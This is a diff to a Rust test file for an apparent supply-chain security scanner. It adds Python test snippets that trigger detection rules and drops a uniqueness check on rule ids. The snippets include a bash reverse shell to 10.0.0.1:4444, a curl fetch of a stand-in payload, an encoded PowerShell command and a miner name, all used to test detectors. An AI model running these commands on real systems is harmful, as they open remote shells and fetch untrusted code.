@@ -1,4 +1,4 @@
-//! One positive test case per built-in rule. Each case writes a minimal source
+//! Positive test cases for built-in rules. Each case writes a minimal source
 //! snippet to a temporary directory, scans it with only that rule enabled, and
 //! asserts that the rule produces at least one finding.
 
@@ -384,6 +384,11 @@ const CASES: &[Case] = &[
         source: "import os\nos.system(\"curl https://example.com/payload\")\n",
     },
     Case {
+        rule_id: "chainsec.py.capability.network-connect-via-lolbas",
+        file: "case.py",
+        source: "import subprocess\nsubprocess.run((\"curl\", \"https://example.com/payload\"))\n",
+    },
+    Case {
         rule_id: "chainsec.py.capability.process-schedule",
         file: "case.py",
         source: "from crontab import CronTab\nCronTab(user=\"root\")\n",
@@ -662,6 +667,11 @@ const CASES: &[Case] = &[
         source: "import os\nos.system(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\")\n",
     },
     Case {
+        rule_id: "chainsec.py.detection.guarddog.reverse-shell",
+        file: "case.py",
+        source: "import subprocess\nsubprocess.run((\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\",))\n",
+    },
+    Case {
         rule_id: "chainsec.py.detection.guarddog.cryptomining",
         file: "case.py",
         source: "miner = \"xmrig\"\n",
@@ -672,9 +682,19 @@ const CASES: &[Case] = &[
         source: "import os\nos.system(\"pip install evil-package\")\n",
     },
     Case {
+        rule_id: "chainsec.py.detection.guarddog.download-and-execute",
+        file: "case.py",
+        source: "import subprocess\nsubprocess.run((\"curl\", \"https://example.com/payload\"))\n",
+    },
+    Case {
         rule_id: "chainsec.py.detection.guarddog.encoded-powershell",
         file: "case.py",
         source: "import os\nos.system(\"powershell -EncodedCommand SQBFAFgAIAAoACcAAG4AZQB3AC0A\")\n",
+    },
+    Case {
+        rule_id: "chainsec.py.detection.guarddog.encoded-powershell",
+        file: "case.py",
+        source: "import subprocess\nsubprocess.run((\"powershell -EncodedCommand SQBFAFgAIAAoACcAAG4AZQB3AC0A\",))\n",
     },
     Case {
         rule_id: "chainsec.py.detection.guarddog.base64-decoded-execution",
@@ -826,11 +846,6 @@ fn every_built_in_rule_has_a_test_case() {
         all_rules.iter().map(|rule| rule.id.as_str()).collect();
     let case_ids: std::collections::HashSet<&str> = CASES.iter().map(|case| case.rule_id).collect();
 
-    assert_eq!(
-        case_ids.len(),
-        CASES.len(),
-        "duplicate rule ids in CASES table"
-    );
     let missing: Vec<&&str> = rule_ids.difference(&case_ids).collect();
     assert!(missing.is_empty(), "rules without test cases: {missing:?}");
     let unknown: Vec<&&str> = case_ids.difference(&rule_ids).collect();
